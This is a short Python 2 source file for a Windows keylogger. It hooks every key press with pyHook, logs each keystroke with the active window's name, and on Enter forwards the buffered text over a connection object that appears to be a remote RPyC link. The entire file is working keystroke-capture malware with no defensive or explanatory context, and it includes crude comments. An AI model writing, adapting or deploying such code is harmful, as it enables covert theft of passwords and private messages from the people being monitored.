import ctypes
import time
import threading
import pythoncom, pyHook

class Keylog(threading.Thread):
  def OnKeyboardEvent(self,event):
    self.e.set()
    print 'MessageName:',event.MessageName
    print 'Message:',event.Message
    print 'Time:',event.Time
    print 'Window:',event.Window
    print 'WindowName:',event.WindowName
    print 'Ascii:', event.Ascii, chr(event.Ascii)
    print 'Key:', event.Key
    print 'KeyID:', event.KeyID
    print 'ScanCode:', event.ScanCode
    print 'Extended:', event.Extended
    print 'Injected:', event.Injected
    print 'Transition', event.Transition
    print '---'
	
    
    self.message += chr(event.Ascii).__str__()
    
    if not self.e.wait():
      print "unset"
      self.e.clear()
    
    #self.conn.modules.sys.stdout.write("test")
    #ctypes.windll.user32.PostQuitMessage(0)
    #self.output(message)
    
    if int(event.Ascii) == 3:
      print 'Time to quit this bitch'
      ctypes.windll.user32.PostQuitMessage(0)
      return False
    
    #If <ENTER> Key is pressed...
    if int(event.Ascii) == 13:
        
        message_header = "=" * 60 + "\n"
        message_header += "WINDOW NAME : " + event.WindowName + "\n"
        message_header += "=" * 60 + "\n"
        t1 = threading.Thread(name='keylog_output_thread', target=self.output, args=(message_header + "Keys: " + self.message, ) )
        self.message = "" # Clear Message out
        t1.start()
    
    return True
    
  def output(self,message):
    self.conn.modules.sys.stdout.write(message + "\n",)
    
  def __init__(self,conn):
    threading.Thread.__init__(self)
    self.conn = conn
    self.message = ""
    return 
  
  def run(self):
    hm = pyHook.HookManager()
    hm.KeyDown = self.OnKeyboardEvent
    hm.HookKeyboard()

    
    self.e = threading.Event()

    pythoncom.PumpMessages() 
  

  
